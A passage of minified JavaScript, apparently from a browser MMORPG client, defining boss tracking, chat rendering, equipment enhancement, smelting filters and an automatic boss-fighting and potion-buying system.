s=t[o];s.data.type==EntityType.Role&&(i||(i=s.infoModel),n=s)}if(!i)return"";var a=i.getNameWithServer2(),r=a.split("\n");return a=r[1]?r[1]:r[0],a||""}return""},e.prototype.checkShow=function(){var t=r.GameMap.fubenID;isNaN(t)||r.GameMap.fubenID!=r.GameMap.lastFbId&&(this.lastBossID=-1)},e.prototype.postHpZero=function(){},__decorate([post()],e.prototype,"postBossAppear",null),__decorate([post()],e.prototype,"postBelongChange",null),__decorate([post()],e.prototype,"postHpZero",null),e}(s.BaseSystem);e.BossCT=u,window.BossCT=u,__reflect(u.prototype,"BossCT",[]),Systemap.BossCT=function(){return u.ins()},window.BossCT=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChatSystemData=void 0;var n=i(205),o=function(t){function e(e,i){var n=t.call(this)||this;return n.type=e,n.str=i,n}return __extends(e,t),e}(n.ChatDataBase);e.ChatSystemData=o,window.ChatSystemData=o,__reflect(o.prototype,"ChatSystemData",[]),window.ChatSystemData=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChatListItemRenderer=void 0;var n=i(3),o=i(186),s=i(102),a=i(44),r=i(45),l=i(8),h=i(157),u=function(t){function e(){var e=t.call(this)||this;return e.emojiTxt=new o.EmojiText,e.clickGrp=new eui.Group,e.clickGrp.x=e.clickGrp.y=0,e.clickGrp.touchEnabled=!0,e.emojiTxt.x=0,e.emojiTxt.lineSpacing=8,e.emojiTxt.textColor=13746831,e.emojiTxt.touchEnabled=!0,e.addChild(e.emojiTxt),e.addChild(e.clickGrp),e.emojiTxt.msgTxt&&e.emojiTxt.msgTxt.addEventListener(egret.TextEvent.LINK,e.txtLink,e),e.clickGrp.addEventListener(egret.TouchEvent.TOUCH_TAP,e.onClickName,e),e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.showHead.visible=!1,this.showText.visible=!1,this.chatVip.visible=!1,this.data&&void 0!==this.data.str){var t=null;t=7==this.data.type?this.data:3==this.data.type?this.data:this.data;var e,i,n=s.KFServerSys.ins().isKF?"S"+t.servId:"",a="";if(0!=t.type&&1!=t.type&&2!=t.type){if(3==t.type)a=t.str,e=o.EmojiText.SYS_IMG,i=a;else{a=t.str;var r=t.times?l.DateUtils.formatMiniDateTime(t.times)/1e3:0,u=r>0?"["+l.DateUtils.getFormatBySecond(r,l.DateUtils.TIME_FORMAT_15)+"]":"";-1!=a.indexOf("<a")&&-1!=a.indexOf("</a>")?(e="<a color=0x16B2FF</a>"+u+"["+t.name+n+"]",i="<a color=0xDFD1B5</a>"+a):(e="|C:0x16B2FF&T:"+u+"["+t.name+n+"]|",i="|C:0xDFD1B5&T:"+a+"|")}this.emojiTxt.textWidth=this.textGroup.width,this.emojiTxt.richText=e+" ",this.clickGrp.x=0,this.clickGrp.width=this.emojiTxt.msgTxt.textWidth,this.clickGrp.height=this.emojiTxt.msgTxt.height,getLangType()==LanguageEnum.AR&&0==isArabic(e+" "+i)&&0==h.RegExpUtil.CHAT_EMOJI_ID.test(i)?this.emojiTxt.richText=i+" "+e:this.emojiTxt.richText=e+" "+i,this.height=this.emojiTxt.uHeight+14}}},e.prototype.txtLink=function(t){r.ChatCT.ins().handleTxtLink(this.data,t.text)},e.prototype.onClickName=function(t){r.ChatCT.ins().MsgOpenWin=!1,a.ReadPlayerCT.ins().sendFindPlayer(this.data.id,this.data.servId)},e.HEAD_BG=["touxiangkuang0","touxiangkuang1"],e}(n.BaseItemRender);e.ChatListItemRenderer=u,window.ChatListItemRenderer=u,__reflect(u.prototype,"ChatListItemRenderer",[]),window.ChatListItemRenderer=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WingEnum=void 0;var n;!function(t){t[t.WingMaxLv=9]="WingMaxLv",t[t.WingExpRedPoint=3]="WingExpRedPoint",t[t.GodWingMaxSlot=4]="GodWingMaxSlot"}(n=e.WingEnum||(e.WingEnum={})),window.WingEnum=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TweenImg=e.BagEquipIntensifyPanel=void 0;var n=i(19),o=i(1),s=i(22),a=i(34),r=i(0),l=i(36),h=i(4),u=i(13),p=i(96),d=i(140),c=i(2),f=i(6),g=i(313),m=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.defaultRect=!1,e._sn_="EquipIntensify",e.sortArr=[0,1,2,3,4,8,6,9,5,7],e._curRole=0,e.idx=0,e.autoing=!1,e.showImg=[],e.attrName=["",gettext("攻击"),gettext("法术"),gettext("道术"),gettext("攻击"),gettext("攻击")],e}return __extends(e,t),e.prototype.skinComplete=function(){this.roleItem.showEff=!1,this.cbImg.visible=!1},e.prototype.addDisplay=function(){observe(this,this.cbIdx,f.BagCT.ins().setSelectEquipIdx),observe(this,this.updateView,p.ForgeCT.ins().postForgeUpdate),observe(this,this.updateGold,h.ActorCC.postGoldChange),f.BagCT.ins().setSelectEquipIdx(0),this.addTouchEvent(this.tzBtn,this.onClick),this.addTouchEvent(this.qh1Btn,this.onClick),this.addTouchEvent(this.qh2Btn,this.onClick),this.updateView()},e.prototype.updateView=function(t){var e=this,i=!1;if(t&&void 0!=(null===t||void 0===t?void 0:t[2])){Timer.stopAll(this);var n=PoolMgr.create(v);this.showImg.push(n),n.source=t[2]?"Qianghua_QHCG":"Qianghua_QHSB",n.y=145,n.horizontalCenter=0,this.cbImg.parent.addChild(n),egret.Tween.get(n).to({y:65},1e3).call(function(){var t=e.showImg.indexOf(n);-1!=t&&(e.showImg.splice(t,1),n.parent&&n.parent.removeChild(n),PoolMgr.release(n))}),i=t[2]?!0:!1}if(!(this.idx<0)){var o=u.SubRoles.ins().getSubRoleByIndex(0),s=o.getEquipByIndex(this.idx);this.roleItem.setIndex(this.idx),this.roleItem.setModel(o),this.roleItem.setCurRole(o.index),this.roleItem.data=s.item,0==s.item.configID&&this.roleItem.setItemImg("xb_1"+d.ForgeConst.EQUIP_POS_TO_SUB[this.idx]);var a=p.ForgeCT.ins().getForgeConfigByPos(this.idx,s.strengthen,0);this.setAttr(this.curAttrLab,a);var r=p.ForgeCT.ins().getForgeConfigByPos(this.idx,s.strengthen+1,0);this.setAttr(this.nexAttrLab,r);var l=p.ForgeCT.ins().getEnhanceCostConfigByLv(s.strengthen+1);if(void 0==l)return void(this.currentState="maxLv");this.currentState="normal",this.labGold.visible=void 0!=l,this.cgLab.visible=this.labGold.visible,this.cgNum.text=l?l.rate/100+"%":"",this.updateGold()}},e.prototype.updateGold=function(){var t=u.SubRoles.ins().getSubRoleByIndex(0),e=t.getEquipByIndex(this.idx),i=p.ForgeCT.ins().getEnhanceCostConfigByLv(e.strengthen+1);if(void 0==i)return void(this.currentState="maxLv");this.currentState="normal";var n=h.ActorCC.gold>=(null===i||void 0===i?void 0:i.gold)?2149168:16720161;this.labGoldNam.text=""+i.gold,this.labGoldNam.textColor=n},e.prototype.setAttr=function(t,e){var i,n="";e||(t.text="max");for(var o=0;o<(null===(i=null===e||void 0===e?void 0:e.attr)||void 0===i?void 0:i.length);o++){var r=e.attr[o].type;if(r==a.AttributeType.atAtkMin){var l=u.SubRoles.ins().getSubRoleByIndex(0);n+=this.attrName[l.job]+"："}else n+=""!=s.AttributeData.getAttrStrByType(r)?s.AttributeData.getAttrStrByType(r)+"：":"";n+=e.attr[o].value,n+=r==a.AttributeType.atAtkMin||r==a.AttributeType.atAtkMageMin||r==a.AttributeType.atAtkTaoistMin||r==a.AttributeType.atDef?" - ":"\n"}t.text=n},e.prototype.cbIdx=function(t){this.idx!=t&&(this.idx=t,this.updateView())},e.prototype.onClick=function(t){switch(t.target){case this.qh1Btn:this.QiangHua();break;case this.tzBtn:win.open(g.BagEquipIntensifySuitTip);break;case this.qh2Btn:this.startAuto()}},e.prototype.removeDisplay=function(){for(f.BagCT.ins().setSelectEquipIdx(-1),Timer.stopAll(this);this.showImg.length;){var t=this.showImg.pop();egret.Tween.removeTweens(t),t.parent&&t.parent.removeChild(t),PoolMgr.release(t)}this.stopAuto()},e.prototype.GuideQxBtn=function(){return this.qh1Btn},e.prototype.QiangHua=function(){var t,e=u.SubRoles.ins().getSubRoleByIndex(0),i=e.getEquipByIndex(this.idx),o=p.ForgeCT.ins().getEnhanceCostConfigByLv(i.strengthen+1);if(!o)return!1;if(h.ActorCC.level<=i.strengthen)return c.TipsCT.ins().showTips(gettext("强化等级不能大于角色等级")),!1;if(!n.GlobalFun.checkCost(o.gold,l.MoneyConst.gold))return!1;if(f.BagCT.ins().getBagGoodsCountById(f.BagCT.BAG_TYPE_OTHTER,o.stoneId)<o.stoneNum){var s=(null===(t=r.GlobalConfig.ItemConfig[o.stoneId])||void 0===t?void 0:t.name)||"";return c.TipsCT.ins().showTips("无"+s),!1}return p.ForgeCT.ins().sendUpGrade(this._curRole,this.idx),!0},e.prototype.startAuto=function(){return __awaiter(this,void 0,void 0,function(){var t,e,i;return __generator(this,function(n){switch(n.label){case 0:if(this.autoing)return[2];this.autoing=!0,t=0,n.label=1;case 1:return t<this.sortArr.length?(e=this.sortArr[t],t>0?[4,sheep(200)]:[3,3]):[3,5];case 2:if(n.sent(),!this.autoing)return[3,5];n.label=3;case 3:console.log("@@选中=",e),f.BagCT.ins().setSelectEquipIdx(e),i=this.QiangHua(),n.label=4;case 4:return t++,[3,1];case 5:return this.autoing=!1,console.log("@@结束自动强化"),[2]}})})},e.prototype.stopAuto=function(){this.autoing&&(this.autoing=!1)},e.prototype.clearPanel=function(){},e
}(o.BaseView);e.BagEquipIntensifyPanel=m,window.BagEquipIntensifyPanel=m,__reflect(m.prototype,"BagEquipIntensifyPanel",[]),window.BagEquipIntensifyPanel=m;var v=function(t){function e(){var e=t.call(this)||this;return e.touchEnabled=!1,e}return __extends(e,t),Object.defineProperty(e.prototype,"source",{get:function(){return egret.superGetter(e,this,"source")},set:function(t){egret.superSetter(e,this,"source",t)},enumerable:!1,configurable:!0}),e.prototype.clear=function(){this.source=null,this.x=this.y=0,this.horizontalCenter=0/0},e.prototype.destroy=function(){this.source=null},e}(eui.Image);e.TweenImg=v,window.TweenImg=v,__reflect(v.prototype,"TweenImg",["IPoolElement"])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SmeltCC=void 0;var n=i(101),o=i(0),s=i(6),a=i(57),r=function(t){function e(){var e=t.call(this)||this;return e.cbSignal="",e}return __extends(e,t),e.prototype.GetCbList=function(t){var e=[],i=o.GlobalConfig.RongLuqQdhsConfig;for(var n in i)i[n].group==t&&e.push(i[n]);return e},e.prototype.setCbSignal=function(t){this.cbSignal=t},e.prototype.getCbSignal=function(){return this.cbSignal},e.prototype.getEqCbNum=function(t,e,i){for(var n,r,l,h,u,p=0,d=0,c=s.BagCT.ins().getBagEquipsByQuality2(t,e),f=0;f<c.length;f++){var g=o.GlobalConfig.RongLuConfig[c[f].configID];!g||g.group&&g.group!=i||(null===(n=s.BagCT.ins().settingBag[a.SettingBagType.RecycleLessLevelEquip])||void 0===n?void 0:n.value)&&(null===(r=c[f].itemConfig)||void 0===r?void 0:r.level)&&(null===(l=c[f].itemConfig)||void 0===l?void 0:l.level)>=(null===(h=s.BagCT.ins().settingBag[a.SettingBagType.RecycleLessLevelEquip])||void 0===h?void 0:h.value)||(null===(u=s.BagCT.ins().settingBag[a.SettingBagType.NotRecycleXiLianEquip])||void 0===u?void 0:u.value)&&c[f].xilian||(p+=g.moneyNum,d++)}return{num:p,num2:d}},e.prototype.getEqCbNum2=function(t,e,i){for(var n,r,l,h,u,p=s.BagCT.ins().getBagEquipsByQuality2(t,e),d=[],c=0;c<p.length;c++){var f=o.GlobalConfig.RongLuConfig[p[c].configID];!f||f.group&&f.group!=i||(null===(n=s.BagCT.ins().settingBag[a.SettingBagType.RecycleLessLevelEquip])||void 0===n?void 0:n.value)&&(null===(r=p[c].itemConfig)||void 0===r?void 0:r.level)&&(null===(l=p[c].itemConfig)||void 0===l?void 0:l.level)>=(null===(h=s.BagCT.ins().settingBag[a.SettingBagType.RecycleLessLevelEquip])||void 0===h?void 0:h.value)||(null===(u=s.BagCT.ins().settingBag[a.SettingBagType.NotRecycleXiLianEquip])||void 0===u?void 0:u.value)&&p[c].xilian||d.push(p[c])}return d},e.prototype.getFuEqCbNum=function(t,e,i){for(var n,r,l,h,u,p=s.BagCT.ins().getBagCallEquipsByItemId(t,e),d=[],c=0;c<p.length;c++){var f=o.GlobalConfig.RongLuConfig[p[c].configID];!f||f.group&&f.group!=i||(null===(n=s.BagCT.ins().settingBag[a.SettingBagType.RecycleLessLevelEquip])||void 0===n?void 0:n.value)&&(null===(r=p[c].itemConfig)||void 0===r?void 0:r.level)&&(null===(l=p[c].itemConfig)||void 0===l?void 0:l.level)>=(null===(h=s.BagCT.ins().settingBag[a.SettingBagType.RecycleLessLevelEquip])||void 0===h?void 0:h.value)||(null===(u=s.BagCT.ins().settingBag[a.SettingBagType.NotRecycleXiLianEquip])||void 0===u?void 0:u.value)&&p[c].xilian||d.push(p[c])}return d},e}(n.CC);window.smeltCC=r,__reflect(r.prototype,"smeltCC",[]),e.SmeltCC=new r,window.SmeltCC=e.SmeltCC},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FEATS_SHOP_TYPE=e.FEATS_TYPE=e.FeatsStoreData=void 0;var n=function(){function t(t,e){this.exchangeCount={},this.exchangeCount={};for(var i,n,o=0;t>o;o++)i=e.readInt(),n=e.readInt(),this.exchangeCount[i]=n}return t}();e.FeatsStoreData=n,window.FeatsStoreData=n,__reflect(n.prototype,"FeatsStoreData",[]);var o;!function(t){t[t.day=1]="day",t[t.infinite=2]="infinite",t[t.forever=3]="forever",t[t.week=4]="week"}(o=e.FEATS_TYPE||(e.FEATS_TYPE={})),window.FEATS_TYPE=o;var s;!function(t){t[t.Money=1]="Money",t[t.Item=2]="Item"}(s=e.FEATS_SHOP_TYPE||(e.FEATS_SHOP_TYPE={})),window.FEATS_SHOP_TYPE=s,window.FeatsStoreData=n,window.FEATS_TYPE=o,window.FEATS_SHOP_TYPE=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RexueID=e.infoType=e.infoData=e.RexueDideCT=void 0;var n=i(14),o=i(8),s=i(0),a=i(7),r=i(26),l=i(2),h=i(27),u=i(18),p=i(30),d=i(64),c=i(43),f=i(4),g=i(217),m=i(112),v=i(91),y=i(6),C=i(24),T=i(52),b=i(20),w=i(32),I=i(162),_=i(167),S=i(114),x=i(23),D=i(102),A=function(t){function e(){var e=t.call(this)||this;return e.overTime=0,e._tick=[],e.bossIdArr=[],e.allBossIdArr=[[],[],[],[]],e.infos=[],e.items=[],e.equips=[],e.isOpenAutoFight=!1,e.autoFightFb=-1,e.INTERVAL_TIME=6e4,e.challangeCount=[0,0,0],e.autoTabSelectIndex=0,e.TypeId=0,e.lastFbId=0,e.isStopBoss=!0,e.sysId=PackageID.RexueDide,e.regNetMsg(1,e.postOverTime),e.regNetMsg(2,e.postTickInfo),e.regNetMsg(4,e.onAutomatichosting),e.regNetMsg(5,e.onStopAutomatichosting),e.regNetMsg(6,e.onAutomatichostingInfo),e.regNetMsg(7,e.onAutomatichostingUpdate),e.regNetMsg(8,e.onAutomatichosItemUpdate),e.regNetMsg(9,e.onAutomatichosEquipUpdate),e.regNetMsg(10,e.onAutomatiChallangeCont),observe(e,e.bossZero,I.BossCT.ins().postHpZero),observe(e,e.checkShow,Ts.enterScene.enterOK),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postOverTime=function(t){this.overTime=o.DateUtils.formatMiniDateTime(t.readInt())},e.prototype.sendTick=function(t,e){var i=this.getBytes(1);i.writeInt(t),i.writeInt(e?1:0),this.sendToServer(i)},e.prototype.postTickInfo=function(t){this._tick=[];for(var e=t.readUnsignedInt(),i=0;e>i;i++){var n=t.readInt();this._tick[n]=t.readInt()}},e.prototype.sendInfo=function(){this.sendBaseProto(3)},e.prototype.checkOpen=function(t){void 0===t&&(t=!1);var e=s.GlobalConfig.AuxiliaryBaseConfig,i="";return a.GameServerCC.serverOpenDay+1<e.openDay?i=gettext("开服{0}天开启",e.openDay):r.ZsCT.ins().stage<e.zsLv&&(i=gettext("{0}转开启",e.zsLv)),t&&""!=i&&l.TipsCT.ins().showTips(i),""==i},Object.defineProperty(e.prototype,"isAct",{get:function(){return this.overTime>a.GameServerCC.serverTime},enumerable:!1,configurable:!0}),e.prototype.getTickById=function(t){return this._tick[t]>0},e.prototype.clearTick=function(){this._tick.length>0&&(this._tick=[])},e.checkEnoughTimeById=function(t,i,n){var o=s.GlobalConfig.AuxiliaryBaseConfig.multiply[t-1];if(!(0>=i)){if(!e.ins().isAct||!e.ins().getTickById(t)||i>=o||t==P.PublicBoss)return void n();var a=h.WarnWin.show(gettext("剩余次数仅剩<font color={0}>{1}次</font>，无法{2}倍挑战",u.ColorUtil.GREEN,i,o),function(){n()},this);a.setBtnLabel(gettext("{0}挑战",o>2&&i>1?gettext("{0}倍",i):"单次"),"取消")}},e.prototype.onAutomatichosting=function(t){this.startTime=t.readInt(),this.autoHp=t.readByte(),this.autoMagic=t.readByte();var e=t.readUnsignedByte();this.bossIdArr=[],this.allBossIdArr=[[],[],[],[]];for(var i=0;e>i;i++){var n=t.readInt(),o=d.MainUICC.getBossTypeId(n);this.bossIdArr.push(n),this.allBossIdArr[o].push(n)}this.isOpenAutoFight=!0,this.autoFightFb=t.readShort(),(b.GameMap.fbType==w.FbCT.FB_TYPE_CITY||b.GameMap.fbType==w.FbCT.FB_TYPE_GUANQIABOSS),this.isStopBoss=!1,Timer.start(3e3,1,this.startAutoBoss,this),Timer.has(this.timeFun,this)||Timer.start(1e3,-1,this.timeFun,this)},e.prototype.postAutomatichosting=function(){},e.prototype.sendAutomatichosting=function(t,e){var i=this.getBytes(4);i.writeByte(t),i.writeByte(e);var n=(this.bossIdArr.length,this.getAllBossLen());i.writeByte(n);for(var o=0;o<this.allBossIdArr.length;o++)for(var s=0;s<this.allBossIdArr[o].length;s++){var a=this.allBossIdArr[o][s];i.writeInt(a)}this.sendToServer(i),win.close("AutoFightWin")},e.prototype.getAllBossLen=function(){var t=0;for(var e in this.allBossIdArr)for(var i in this.allBossIdArr[e])t++;return t},e.prototype.onStopAutomatichosting=function(t){t.readInt();Timer.stop(this.startAutoBoss,this),this.isStopBoss=!0,this.isOpenAutoFight=!1,this.autoFightFb=-1,this.infos=[],this.items=[],this.equips=[],this.postStopAutomatichosting(),Timer.has(this.timeFun,this)&&Timer.stop(this.timeFun,this)},e.prototype.postStopAutomatichosting=function(){},e.prototype.sendStopAutomatichosting=function(){var t=this.getBytes(5);this.sendToServer(t)},e.prototype.onAutomatichostingInfo=function(t){var e=t.readUnsignedByte();this.infos=[];for(var i=0;e>i;i++){var n=new k;n.parser(t),this.infos.push(n)}this.items=[];for(var o=t.readInt(),i=0;o>i;i++){var n=new p.RewardData;n.type=1,n.id=t.readInt(),n.count=t.readInt(),this.items.push(n)}this.equips=[];for(var s=t.readInt(),i=0;s>i;i++)for(var a=t.readInt(),r=t.readInt(),l=t.readByte(),h=0;r>h;h++){var n=new g.RandomItemData;n.id=a,n.type=1,n.quality=l,this.equips.push(n)}this.postAutomatichostingInfo()},e.prototype.onAutomatichostingUpdate=function(t){var e=t.readUnsignedByte();this.infos=[];for(var i=0;e>i;i++){var n=new k;n.parser(t),this.infos.push(n)}this.postAutomatichostingInfo()},e.prototype.onAutomatichosItemUpdate=function(t){for(var e=!1,i=t.readInt(),n=0;i>n;n++){e=!1;var o=new p.RewardData;o.type=1,o.id=t.readInt(),o.count=t.readInt();for(var s=0;s<this.items.length;s++)if(this.items[s].id==o.id){this.items[s].count=this.items[s].count+o.count,e=!0;break}e||this.items.push(o)}this.postAutomatiItemInfo()},e.prototype.onAutomatichosEquipUpdate=function(t){for(var e=t.readInt(),i=0;e>i;i++)for(var n=t.readInt(),o=t.readInt(),s=t.readByte(),a=0;o>a;a++){var r=new g.RandomItemData;r.id=n,r.type=1,r.quality=s,this.equips.push(r)}this.postAutomatichostingInfo()},e.prototype.postAutomatichostingInfo=function(){},e.prototype.postAutomatiItemInfo=function(){},e.prototype.onAutomatiChallangeCont=function(t){this.challangeCount[0]=t.readByte(),this.challangeCount[1]=t.readByte(),this.challangeCount=[20,20,20]},e.prototype.changeBossArr=function(t,e){void 0===e&&(e=1);var i=this.allBossIdArr[this.autoTabSelectIndex].indexOf(t);e?0>i&&this.allBossIdArr[this.autoTabSelectIndex].push(t):i>=0&&this.allBossIdArr[this.autoTabSelectIndex].splice(i,1),this.postChangeBossArr()},e.prototype.postChangeBossArr=function(){},e.prototype.selectAllBoos=function(){var t;this.TypeId=c.CityCC.ins().CITI_FB_BOSS_TYPE[this.autoTabSelectIndex];var e=d.MainUICC.getMapBossList(this.TypeId);if(this.isSelectAll())this.allBossIdArr[this.autoTabSelectIndex]=[];else if(this.allBossIdArr[this.autoTabSelectIndex],-1==this.autoTabSelectIndex);else{if(3==this.autoTabSelectIndex){e=d.MainUICC.getKFBossList();var i=S.KFBossSys.ins().kfBossAutoFightArr}else i=c.CityCC.ins().mapBossList;for(var n=0;n<e.length;n++){var o=e[n],a=this.allBossIdArr[this.autoTabSelectIndex].indexOf(o.bossId),r=s.GlobalConfig.InstanceConfig[o.fbId],l=r?r.powerlimit:0;(null===(t=i[o.bossId])||void 0===t?void 0:t.isExKo)&&f.ActorCC.power>l&&0>a&&this.allBossIdArr[this.autoTabSelectIndex].push(o.bossId)}}this.postSelectAllBoss()},e.prototype.isSelectAll=function(){var t,e,i=0,n=[];3==this.autoTabSelectIndex?(n=d.MainUICC.getKFBossList(),e=S.KFBossSys.ins().kfBossAutoFightArr):(this.TypeId=c.CityCC.ins().CITI_FB_BOSS_TYPE[this.autoTabSelectIndex],n=d.MainUICC.getMapBossList(this.TypeId),e=c.CityCC.ins().mapBossList);for(var o=0;o<n.length;o++){var a=n[o],r=s.GlobalConfig.InstanceConfig[a.fbId],l=r?r.powerlimit:0;(null===(t=e[a.bossId])||void 0===t?void 0:t.isExKo)&&e&&f.ActorCC.power>l&&i++}var h=i==this.allBossIdArr[this.autoTabSelectIndex].length;return h},e.prototype.isSeleced=function(t){return this.allBossIdArr[this.autoTabSelectIndex].indexOf(t)>=0},e.prototype.postSelectAllBoss=function(){},Object.defineProperty(e.prototype,"StartTime",{get:function(){return o.DateUtils.formatMiniDateTime(this.startTime)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"AutoOverTime",{get:function(){return a.GameServerCC.serverTime-this.StartTime},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"AutoOverTimeStr",{get:function(){var t=s.GlobalConfig.GuajiBaseConfig.timeMax;return this.AutoOverTime>=1e3*t?o.DateUtils.getFormatBySecond(t,o.DateUtils.TIME_FORMAT_1):o.DateUtils.getFormatBySecond(this.AutoOverTime/1e3,o.DateUtils.TIME_FORMAT_1)},enumerable:!1,configurable:!0}),e.prototype.AutoFightDead=function(){var t=this;send(Ts.relive),Timer.start(1e3,1,function(){c.CityCC.ins().sendCityGo(0,t.autoFightFb)},this)},e.prototype.autoBuyHp=function(){if(0==this.autoHp)return void console.log("自动购买生命药未开启");var t=m.SysSetting.ins().getValue(m.SysSetting.HP_ITEM)?m.SysSetting.ins().getValue(m.SysSetting.HP_ITEM):v.ItemConst.HP_ITEM1,e=y.BagCT.ins().getBagItemById(t),i=C.CommonUtils.getObjectByAttr(s.GlobalConfig.ItemStoreConfig,"itemId",t);if(i){var n=i.cost,o=e?e.count:0;if(n.count<=f.ActorCC.gold&&5>o&&y.BagCT.ins().getAllSurplusCount(1)>0&&this.checkCanBuy(i.itemId)){var a=[i.index,1];T.Shop.ins().sendBuy(1,[a]),console.log("购买血量道具")}}},e.prototype.autoBuyMp=function(){if(0==this.autoMagic)return void console.log("自动购买魔法药未开启");var t=m.SysSetting.ins().getValue(m.SysSetting.MP_ITEM)?m.SysSetting.ins().getValue(m.SysSetting.MP_ITEM):v.ItemConst.MP_ITEM1,e=y.BagCT.ins().getBagItemById(t),i=C.CommonUtils.getObjectByAttr(s.GlobalConfig.ItemStoreConfig,"itemId",t);if(i){var n=i.cost,o=e?e.count:0;if(n.count<=f.ActorCC.gold&&5>o&&y.BagCT.ins().getAllSurplusCount(1)>0&&this.checkCanBuy(i.itemId)){var a=[i.index,1];T.Shop.ins().sendBuy(1,[a]),console.log("购买魔法道具")}}},e.prototype.checkCanBuy=function(t){var e=_.SmeltCC.GetCbList(4)||[],i=[];for(var n in e)e[n].itemid[0]==t&&i.push(e[n].itemid[0]);return-1!=i.indexOf(t)?!0:!1},e.prototype.bossZero=function(){if(!c.CityCC.ins().isChangeScene&&b.GameMap.fbType!=w.FbCT.FB_TYPE_QIYU_BOSS){var t=b.GameMap.checkIsKf(!1);if(t&&!this.isStopBoss&&(b.GameMap.fbType==w.FbCT.FB_KF||b.GameMap.fbType==w.FbCT.FB_TYPE_DEVILDOM_BOSS)){if(this.lastFbId==b.GameMap.fubenID)return;return console.log("退出跨服时间戳："+a.GameServerCC.serverTime),this.lastFbId=b.GameMap.fubenID,void send(Ts.exitFB)}this.autoBoss();}},e.prototype.checkShow=function(){this.lastFbId=-1},e.prototype.timeFun=function(){this.autoHp&&e.ins().autoBuyHp(),this.autoMagic&&e.ins().autoBuyMp()},e.prototype.startAutoBoss=function(){if(this.isStopBoss)return void(this.isStopBoss=!1);this.autoBoss();var t=1e3||this.INTERVAL_TIME;Timer.has(this.autoBoss,this)||Timer.start(t,-1,this.autoBoss,this)},e.prototype.stopAutoBoss=function(){this.isStopBoss=!0,Timer.has(this.autoBoss,this)&&Timer.stop(this.autoBoss,this)},e.prototype.autoBoss=function(){if(!(c.CityCC.ins().isChangeScene||D.KFServerSys.ins().isLinkingKF||b.GameMap.fbType!=w.FbCT.FB_TYPE_CITY&&b.GameMap.fbType!=w.FbCT.FB_TYPE_GUANQIABOSS)){for(var t=[],e=0;e<this.allBossIdArr.length;e++)for(var i=this.allBossIdArr.length-e-1,n=0;n<this.allBossIdArr[i].length;n++)t.push(this.allBossIdArr[i][n]);for(var e=0;e<t.length;e++){var r=t[e],l=void 0;l=C.CommonUtils.getObjectByAttr(s.GlobalConfig.CityFbBossConfig,"bossId",r),l||(l=C.CommonUtils.getObjectByAttr(s.GlobalConfig.WoLongCrossBossConfig,"bossId",r));var h=void 0,u=c.CityCC.ins().mapBossList,p=S.KFBossSys.ins().kfBossAutoFightArr;u[r]?h=c.CityCC.ins().mapBossList:p[r]&&(h=p);var d=h?h[r].time:0;if(b.GameMap.fubenID==l.fbId&&(0>=d||(DateUtils.formatMiniDateTime(d)-a.GameServerCC.serverTime)/1e3<=0))return}for(var e=0;e<t.length;e++){var r=t[e],h=void 0,u=c.CityCC.ins().mapBossList,p=S.KFBossSys.ins().kfBossAutoFightArr;u[r]?h=c.CityCC.ins().mapBossList:p[r]&&(h=p);var d=h?h[r].time:0;var l = void 0;l = C.CommonUtils.getObjectByAttr(s.GlobalConfig.CityFbBossConfig, "bossId", r),l || (l = C.CommonUtils.getObjectByAttr(s.GlobalConfig.WoLongCrossBossConfig, "bossId", r));if(0>=d||(DateUtils.formatMiniDateTime(d)-a.GameServerCC.serverTime)/1e3<=(l.TypeId==1?2:l.TypeId==2?7:l.TypeId==3?5:10)){if(!l)return;var f=l.fbId,g=s.GlobalConfig.InstanceConfig[l.fbId];if(b.GameMap.fubenID!=f){var m=s.GlobalConfig.MonstersConfig[r];if(g.type==w.FbCT.FB_KF||g.type==w.FbCT.FB_TYPE_DEVILDOM_BOSS){if(!(this.challangeCount[2]>0&&x.GameLogic.ins().kfCost>=m.crusade))continue;S.KFBossSys.ins().sendKfBossGo(l.id)}else{if(!(1==l.TypeId||this.challangeCount[l.TypeId-2]>0))continue;if(3==l.TypeId&&x.GameLogic.ins().kfCost<m.crusade)continue;c.CityCC.ins().sendCityGo(0,f)}return}}}var e=this.getAllBossLen();;if(0!=e){for(var i=!1,n=s.GlobalConfig.InstanceBaseConfig.interrupt,o=0;o<n.length;o++)if(b.GameMap.fbType==n[o]){i=!0;break}i||b.GameMap.fubenID==this.autoFightFb||-1==this.autoFightFb||c.CityCC.ins().sendCityGo(0,this.autoFightFb)}}},__decorate([post()],e.prototype,"postOverTime",null),__decorate([post()],e.prototype,"postTickInfo",null),__decorate([post()],e.prototype,"postAutomatichosting",null),__decorate([post()],e.prototype,"postStopAutomatichosting",null),__decorate([post()],e.prototype,"postAutomatichostingInfo",null),__decorate([post()],e.prototype,"postAutomatiItemInfo",null),__decorate([post()],e.prototype,"onAutomatiChallangeCont",null),__decorate([post()],e.prototype,"postChangeBossArr",null),__decorate([post()],e.prototype,"postSelectAllBoss",null),e}(n.BaseSystem);e.RexueDideCT=A,window.RexueDideCT=A,__reflect(A.prototype,"RexueDideCT",[]);var k=function(){function t(){}return t.prototype.parser=function(t){this.type=t.readByte(),this.value=t.readInt()},t}();e.infoData=k,window.infoData=k,__reflect(k.prototype,"infoData",[]),window.infoData=k;var B;!function(t){t[t.gold=0]="gold",t[t.goldEfficiency=1]="goldEfficiency",t[t.exp=2]="exp",t[t.expEfficiency=3]="expEfficiency",t[t.monster=4]="monster",t[t.eliteMonster=5]="eliteMonster",t[t.bossMomnster=6]="bossMomnster",t[t.lordMonster=7]="lordMonster",t[t.equip=8]="equip",t[t.outEquip=9]="outEquip",t[t.exEquip=10]="exEquip",t[t.rareEquip=11]="rareEquip"}(B=e.infoType||(e.infoType={})),window.infoType=B,window.infoType=B;var 